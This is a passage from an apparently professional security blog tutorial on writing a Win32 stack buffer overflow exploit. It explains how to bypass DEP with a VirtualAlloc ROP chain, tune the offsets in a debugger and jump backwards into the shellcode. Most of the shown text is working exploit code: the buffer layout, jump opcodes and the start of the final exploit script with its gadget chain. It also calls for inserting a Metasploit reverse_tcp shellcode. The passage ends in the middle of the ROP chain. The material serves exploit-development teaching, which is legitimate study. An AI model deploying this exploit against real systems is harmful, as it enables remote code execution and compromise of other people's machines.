width="508" height="272" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?resize=508%2C272&#038;ssl=1" alt class="wp-image-7766 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?w=508&amp;ssl=1 508w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?resize=300%2C161&amp;ssl=1 300w" data-lazy-sizes="(max-width: 508px) 100vw, 508px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?resize=508%2C272&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7766" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/30/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?fit=508%2C272&amp;ssl=1" data-orig-size="508,272" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="30" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?fit=300%2C161&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?fit=508%2C272&amp;ssl=1" loading="lazy" width="508" height="272" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?resize=508%2C272&#038;ssl=1" alt="" class="wp-image-7766" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?w=508&amp;ssl=1 508w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?resize=300%2C161&amp;ssl=1 300w" sizes="(max-width: 508px) 100vw, 508px" data-recalc-dims="1" /></noscript></figure></div>



<p>Now we just need to go backwards in the CPU window to find the “B”s (0x42) we put in the shellcode space, and look at the offset Immunity gives for the first “B”.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7767" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/31/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?fit=474%2C165&amp;ssl=1" data-orig-size="474,165" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="31" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?fit=300%2C104&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?fit=474%2C165&amp;ssl=1" loading="lazy" width="474" height="165" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?resize=474%2C165&#038;ssl=1" alt class="wp-image-7767 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?w=474&amp;ssl=1 474w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?resize=300%2C104&amp;ssl=1 300w" data-lazy-sizes="(max-width: 474px) 100vw, 474px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?resize=474%2C165&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7767" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/31/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?fit=474%2C165&amp;ssl=1" data-orig-size="474,165" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="31" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?fit=300%2C104&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?fit=474%2C165&amp;ssl=1" loading="lazy" width="474" height="165" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?resize=474%2C165&#038;ssl=1" alt="" class="wp-image-7767" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?w=474&amp;ssl=1 474w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/31.png?resize=300%2C104&amp;ssl=1 300w" sizes="(max-width: 474px) 100vw, 474px" data-recalc-dims="1" /></noscript></figure></div>



<p>We need to jump backwards 0x37D bytes (893 bytes).</p>



<p>To make that jump, we return to the metasm_shell.rb script in the Metasploit framework:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7768" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/32/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?fit=619%2C204&amp;ssl=1" data-orig-size="619,204" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="32" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?fit=300%2C99&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?fit=619%2C204&amp;ssl=1" loading="lazy" width="619" height="204" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?resize=619%2C204&#038;ssl=1" alt class="wp-image-7768 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?w=619&amp;ssl=1 619w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?resize=300%2C99&amp;ssl=1 300w" data-lazy-sizes="(max-width: 619px) 100vw, 619px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?resize=619%2C204&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7768" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/32/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?fit=619%2C204&amp;ssl=1" data-orig-size="619,204" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="32" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?fit=300%2C99&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?fit=619%2C204&amp;ssl=1" loading="lazy" width="619" height="204" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?resize=619%2C204&#038;ssl=1" alt="" class="wp-image-7768" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?w=619&amp;ssl=1 619w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/32.png?resize=300%2C99&amp;ssl=1 300w" sizes="(max-width: 619px) 100vw, 619px" data-recalc-dims="1" /></noscript></figure></div>



<p>We are going to add that jump just behind the rop chain (where VirtualAlloc returns) and put some NOPs and a breakpoint in the shellcode, to make sure we can execute code in that piece of stack. On the first run of the exploit, we need to look at the value of the lpAddress parameter, and then look at the address the jump goes to. Then we need to calculate the offset and fix the rop chain to make sure lpAddress is the same address where the jump lands, or at least an address before the jump address.</p>



<p>Here is the piece of code we modify from the previous exploit:</p>



<pre class="wp-block-code"><code>#0x5f4011f2 : # RET                          &#91;SLMFC.DLL]
EIP=struct.pack(&lt;I,0x5f4011f2)
move_esp = \x81\xc4\xc0\xfb\xff\xff # add esp,-440h
jmp_back = \xe9\x7e\xfc\xff\xff # jmp $-37Dh

shellcode = \xcc\xcc\xcc\xcc
nop_chain = \x90 * 20

eip_offset = 4654
shellcode_offset = 4092
shellcode_size = 562
buff_size = 6000

rop_chain = create_rop_chain()

buffer = 'A' * shellcode_offset
buffer += nop_chain
buffer += shellcode
buffer += 'B' * (eip_offset - len(buffer)) # Here is where the real shellcode goes
buffer += EIP
buffer += rop_chain
buffer += jmp_back
buffer += 'C' * (buff_size - len(buffer))</code></pre>



<p>Once again, execute the exploit with a breakpoint on the last gadget of the rop chain and step forward to the VirtualAlloc call (16 steps with F7):</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7770" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/33/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?fit=560%2C105&amp;ssl=1" data-orig-size="560,105" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="33" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?fit=300%2C56&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?fit=560%2C105&amp;ssl=1" loading="lazy" width="560" height="105" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?resize=560%2C105&#038;ssl=1" alt class="wp-image-7770 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?w=560&amp;ssl=1 560w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?resize=300%2C56&amp;ssl=1 300w" data-lazy-sizes="(max-width: 560px) 100vw, 560px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?resize=560%2C105&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7770" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/33/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?fit=560%2C105&amp;ssl=1" data-orig-size="560,105" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="33" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?fit=300%2C56&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?fit=560%2C105&amp;ssl=1" loading="lazy" width="560" height="105" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?resize=560%2C105&#038;ssl=1" alt="" class="wp-image-7770" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?w=560&amp;ssl=1 560w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/33.png?resize=300%2C56&amp;ssl=1 300w" sizes="(max-width: 560px) 100vw, 560px" data-recalc-dims="1" /></noscript></figure></div>



<p>Looking at the stack, we can see the lpAddress in this execution (yours may differ because of the ASLR) is 0x01C79FA4.</p>



<p>Pass the VirtualAlloc with F8 and two more steps with F7 to gain the jump instruction:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7771" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/34/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/34.png?fit=262%2C66&amp;ssl=1" data-orig-size="262,66" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="34" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/34.png?fit=262%2C66&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/34.png?fit=262%2C66&amp;ssl=1" loading="lazy" width="262" height="66" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/34.png?resize=262%2C66&#038;ssl=1" alt class="wp-image-7771 jetpack-lazy-image" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/34.png?resize=262%2C66&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7771" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/34/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/34.png?fit=262%2C66&amp;ssl=1" data-orig-size="262,66" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="34" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/34.png?fit=262%2C66&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/34.png?fit=262%2C66&amp;ssl=1" loading="lazy" width="262" height="66" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/34.png?resize=262%2C66&#038;ssl=1" alt="" class="wp-image-7771" data-recalc-dims="1"/></noscript></figure></div>



<p>Here we see the jump will land at 0x01C79EF3, an address that is before the address we use in lpAddress. This means if we try to exec a NOP here, in some cases there should be an access violation error. To make sure the exploit works we need to get the offset between 0x01C79FA4 and 0x01C79EF3 (0x01C79FA4&nbsp; &#8211; 0x01C79EF3 = 0xB1) and fix the rop chain. We were adding -0x190, so now we need to change it to 0x241 (0x190 + 0xB1 = 0x241). The twos complement of 0x241 is 0xFFFFFDBF.</p>



<p>Here is the section of the chain we need to modify:</p>



<pre class="wp-block-code"><code>                  # lpAddress (Address where start the DEP disabled)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFDBF,     # Value to EAX (-577 bytes (0x241))
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08</code></pre>



<p>Try the same with this exploit and compare the lpAddress value and the jump one:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7772" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/35/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?fit=510%2C70&amp;ssl=1" data-orig-size="510,70" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="35" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?fit=300%2C41&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?fit=510%2C70&amp;ssl=1" loading="lazy" width="510" height="70" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?resize=510%2C70&#038;ssl=1" alt class="wp-image-7772 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?w=510&amp;ssl=1 510w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?resize=300%2C41&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?resize=510%2C70&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7772" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/35/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?fit=510%2C70&amp;ssl=1" data-orig-size="510,70" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="35" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?fit=300%2C41&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?fit=510%2C70&amp;ssl=1" loading="lazy" width="510" height="70" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?resize=510%2C70&#038;ssl=1" alt="" class="wp-image-7772" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?w=510&amp;ssl=1 510w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/35.png?resize=300%2C41&amp;ssl=1 300w" sizes="(max-width: 510px) 100vw, 510px" data-recalc-dims="1" /></noscript></figure></div>



<p>As we can see, now the address is the same, and following the jump we get the second NOP of the chain we put in front of the shellcode:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7773" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/36/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?fit=339%2C291&amp;ssl=1" data-orig-size="339,291" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="36" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?fit=300%2C258&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?fit=339%2C291&amp;ssl=1" loading="lazy" width="339" height="291" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?resize=339%2C291&#038;ssl=1" alt class="wp-image-7773 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?w=339&amp;ssl=1 339w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?resize=300%2C258&amp;ssl=1 300w" data-lazy-sizes="(max-width: 339px) 100vw, 339px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?resize=339%2C291&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7773" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/36/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?fit=339%2C291&amp;ssl=1" data-orig-size="339,291" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="36" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?fit=300%2C258&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?fit=339%2C291&amp;ssl=1" loading="lazy" width="339" height="291" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?resize=339%2C291&#038;ssl=1" alt="" class="wp-image-7773" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?w=339&amp;ssl=1 339w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/36.png?resize=300%2C258&amp;ssl=1 300w" sizes="(max-width: 339px) 100vw, 339px" data-recalc-dims="1" /></noscript></figure></div>



<p>We need to fix the lpAddress value and the jump code to jump one more byte to 0x02909EF2 (the first two bytes of the address could be different because of ASLR).</p>



<pre class="wp-block-code"><code>#lpAddress
0xFFFFFDbe,        # Value to EAX (-578 bytes (0x242))
# Jump backwards opcodes
jmp_back = \xe9\x7d\xfc\xff\xff # jmp $-37E</code></pre>



<p>Now we just need to replace the shellcode witha reverse_tcp one from the Metasploit Framework, removing all the NOPs, because now we are landing on the first one and ensuring we have 562 bytes for a shellcode.</p>



<p>As we saw in the exploits before, remember to add the code to move away from ESP before executing the shellcode. This code length is six bytes, so we need 556 bytes for the final shellcode.</p>



<p>Final exploit:</p>



<pre class="wp-block-code"><code>import sys
import socket
import struct

def create_rop_chain():
                rop_gadgets = &#91;
                  # Put a valid pointer on EAX
                  0x5f48c086,       # MOV EAX,ECX # RETN
                  #--- Save ESP into ECX
                  0x5f42F7dc,       # PUSH ESP # INC ESI # ADD DWORD PTR DS:&#91;EAX],EAX # POP ECX # MOV EAX,ESI # POP ESI # RETN 0x04
                  0x41414141,      # to pop esi
                  0x5f4011f2,        # RET
                  0x41414141,      # compensate retn 0x04
                  # Ptr to VirtualAlloc on EAX
                  0x5f418fac,         # POP EAX # RETN
                  0x5f49a1cc,        # PTR to kernel32.dll
                  0x5f488461,       # MOV EAX,DWORD PTR DS:&#91;EAX] # RETN 0x04
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x04
                  0x5f445803,       # POP EDI # RETN
                  0xffffff28,            # Offset to VirtualAlloc -0xd8
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  # Save the pointer to VirtualAlloc
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # returnTo (Address where VirtualAlloc returns: must be behind the rop_chain)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFEC0,      # Value to EAX (-0x140)
                  0x5f465969,       # NEG EAX # RETN
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  # Save returnTo
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # lpAddress (Address where start the DEP disabled)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFDBE,     # Value to EAX (-578 bytes (0x242))
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # dwSize (0x1FF)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFE01,      # Value to EAX (-0x1FF)
                  0x5f465969,       # NEG EAX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # flAllocationType (0x1000)
